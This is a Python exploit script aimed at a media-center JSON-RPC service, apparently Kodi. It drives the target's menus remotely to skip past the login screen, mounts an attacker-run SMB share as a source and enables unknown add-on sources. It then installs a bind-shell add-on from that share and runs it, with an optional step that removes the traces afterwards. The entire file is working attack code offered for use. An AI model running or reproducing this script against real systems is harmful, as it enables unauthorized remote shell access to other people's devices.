import requests
import argparse
import threading
import socket
from struct import *
import time
import sys

from impacket import smbserver

def do_input_request(ip, port, method):
	url = 'http://' + ip + ':' + port + '/jsonrpc'
	data = '[{"jsonrpc":"2.0","method":"' + method + '","params":[],"id":13}]'
	resp = requests.post(url, data = data)
	return resp.status_code == 200

def do_send_text(ip, port, text):
	url = 'http://' + ip + ':' + port + '/jsonrpc'
	data = '[{"jsonrpc":"2.0","method":"Input.SendText","params":{"text":"' + text + '"},"id":13}]'
	resp = requests.post(url, data = data)
	return resp.status_code == 200	

def do_action_request(ip, port, method):
	url = 'http://' + ip + ':' + port + '/jsonrpc'
	data = '[{"jsonrpc":"2.0","method":"Input.ExecuteAction","params":{"action":"' + method + '"},"id":13}]'
	resp = requests.post(url, data = data)
	return resp.status_code == 200

##
# The SMB Server function. Runs on its own thread.
# @param lip the listening IP address
##
def smb_server(lip):
    server = smbserver.SimpleSMBServer(listenAddress=lip, listenPort=445)
    server.addShare('00000000', '.', '')
    server.setSMBChallenge('')
    server.setLogFile('/dev/null')
    server.start()

if __name__ == '__main__':

    top_parser = argparse.ArgumentParser(description='test')
    top_parser.add_argument('--rip', action="store", dest="rip", required=True, help="The IPv4 address to connect to")
    top_parser.add_argument('--rport', action="store", dest="rport", help="The port to connect to", default="8080")
    top_parser.add_argument('--lip', action="store", dest="lip", required=True, help="The local IPv4 address")
    top_parser.add_argument('--reboot', action="store", dest="reboot", help="Reboot the remote target")
    top_parser.add_argument('--clean', action="store", dest="clean", help="Attempt to clean up the environment")
    args = top_parser.parse_args()

    if args.reboot != None:
        print("[+] Sending reboot request.")
        url = 'http://' + args.rip + ':' + args.rport + '/jsonrpc'
        data = '[{"jsonrpc":"2.0","method":"System.Reboot","params":[],"id":13}]'
        resp = requests.post(url, data = data)
        print("[+] Done.")
        sys.exit(0)

    # spin up the SMB server thread
    print "[+] Spinning up the SMB Server"
    smb_thread = threading.Thread(target=smb_server, args=(args.lip, ))
    smb_thread.daemon = True;
    smb_thread.start()

    # Force return to the main page (aka login bypass)
    do_input_request(args.rip, args.rport, "Input.Home")

    # We're at the home screen but could have any menu item selected. Page up to reach the first item (TV shows)
    do_action_request(args.rip, args.rport, "pageup")
    do_action_request(args.rip, args.rport, "pageup")

    # Go up one (power) and right one (settings) and hit enter
    do_input_request(args.rip, args.rport, "Input.Up")
    do_input_request(args.rip, args.rport, "Input.Right")
    do_input_request(args.rip, args.rport, "Input.Select")

    # We're in the settings page. We could be anywhere though. Page up (Player || File Manager) and then up (File manger). Hit enter
    do_action_request(args.rip, args.rport, "pageup")
    do_input_request(args.rip, args.rport, "Input.Up")
    do_input_request(args.rip, args.rport, "Input.Select")

    # Page down to 'add source'
    do_action_request(args.rip, args.rport, "pagedown")
    do_input_request(args.rip, args.rport, "Input.Select")

    # Cancel may or may not be selected. Try to go down two times and then back up two times to input
    do_input_request(args.rip, args.rport, "Input.Down")
    do_input_request(args.rip, args.rport, "Input.Down")
    do_input_request(args.rip, args.rport, "Input.Up")
    do_input_request(args.rip, args.rport, "Input.Up")
    do_input_request(args.rip, args.rport, "Input.Select")

    # Add file source pops. Hit select to add what we want [note this can go bad depending if cancel or none is selected]
    time.sleep(1)
    do_send_text(args.rip, args.rport, "smb://" + args.lip + "/00000000/")
    time.sleep(1)

    # Move to ok and hit enter
    do_input_request(args.rip, args.rport, "Input.Up")
    do_input_request(args.rip, args.rport, "Input.Left")
    do_input_request(args.rip, args.rport, "Input.Select")

    # We just created an attacker owned source! High five!

    # Back to home
    do_input_request(args.rip, args.rport, "Input.Home")

    # Into settings
    do_input_request(args.rip, args.rport, "Input.Select")

    # Into System
    do_input_request(args.rip, args.rport, "Input.Down")
    do_action_request(args.rip, args.rport, "pagedown")
    do_input_request(args.rip, args.rport, "Input.Select")

    # Here we assume "standard" layout. In basic, add-ons is the last item
    do_input_request(args.rip, args.rport, "Input.Up")
    do_input_request(args.rip, args.rport, "Input.Up")
    do_input_request(args.rip, args.rport, "Input.Right")

    # Enable unknown sources
    do_input_request(args.rip, args.rport, "Input.Up")
    do_input_request(args.rip, args.rport, "Input.Up")
    do_input_request(args.rip, args.rport, "Input.Select")

    # Yes we are sure
    do_input_request(args.rip, args.rport, "Input.Left")
    do_input_request(args.rip, args.rport, "Input.Select")

    # Back to home
    do_input_request(args.rip, args.rport, "Input.Home")

    # Into settings
    do_input_request(args.rip, args.rport, "Input.Select")

    # Back up and right to add-ons
    do_action_request(args.rip, args.rport, "pageup")
    do_input_request(args.rip, args.rport, "Input.Up")
    do_input_request(args.rip, args.rport, "Input.Right")
    do_input_request(args.rip, args.rport, "Input.Select")

    # Up two to "Install from zip file" (go up since extra fields might exist)
    do_input_request(args.rip, args.rport, "Input.Up")
    do_input_request(args.rip, args.rport, "Input.Up")
    do_input_request(args.rip, args.rport, "Input.Select")

    # our smb share "0000000" should be the first one due to alphabetical ordering (alphanum first)
    do_input_request(args.rip, args.rport, "Input.Down")
    do_input_request(args.rip, args.rport, "Input.Select")

    # should be only one entry in our directory
    do_input_request(args.rip, args.rport, "Input.Down")
    do_input_request(args.rip, args.rport, "Input.Select")

    print("[+] Pausing for install to take affect...")
    time.sleep(5)

    # execute the shell
    url = 'http://' + args.rip + ':' + args.rport + '/jsonrpc'
    data = '[{"jsonrpc":"2.0","method":"Addons.ExecuteAddon","params":{"addonid":"script.bind.shell.1270"},"id":10}]'
    resp = requests.post(url, data = data)
    if resp.status_code == 200:
        print '[+] Success!'

        # return to main menu
        do_input_request(args.rip, args.rport, "Input.Home")

        if args.clean != None:
            print '[+] Attempting to clean remove SMB source...'

            # Into settings
            do_input_request(args.rip, args.rport, "Input.Select")

            # Right to filemanager
            do_input_request(args.rip, args.rport, "Input.Left")
            do_input_request(args.rip, args.rport, "Input.Select")

            # Page up to the top of the left. And right to top of the right
            do_action_request(args.rip, args.rport, "pageup")
            do_input_request(args.rip, args.rport, "Input.Right")

            # pop up the context menu
            do_input_request(args.rip, args.rport, "Input.ContextMenu")

            # down two to remove source
            do_input_request(args.rip, args.rport, "Input.Down")
            do_input_request(args.rip, args.rport, "Input.Down")

            # remove the source
            do_input_request(args.rip, args.rport, "Input.Select")

            time.sleep(1)

            # yes, we're sure
            do_input_request(args.rip, args.rport, "Input.Left")
            do_input_request(args.rip, args.rport, "Input.Select")

            # move back to an exploitable state
            do_input_request(args.rip, args.rport, "Input.Left")
            do_input_request(args.rip, args.rport, "Input.Home")
            do_input_request(args.rip, args.rport, "Input.Left")
            do_input_request(args.rip, args.rport, "Input.Down")
        else:
            print('[+] Sleeping for 10 minutes before quitting.')
            time.sleep(600)

    else:
        print '[-] Failure! Host left in unknown state... gonna sleep'
        time.sleep(600)

    print("[+] Done :)")


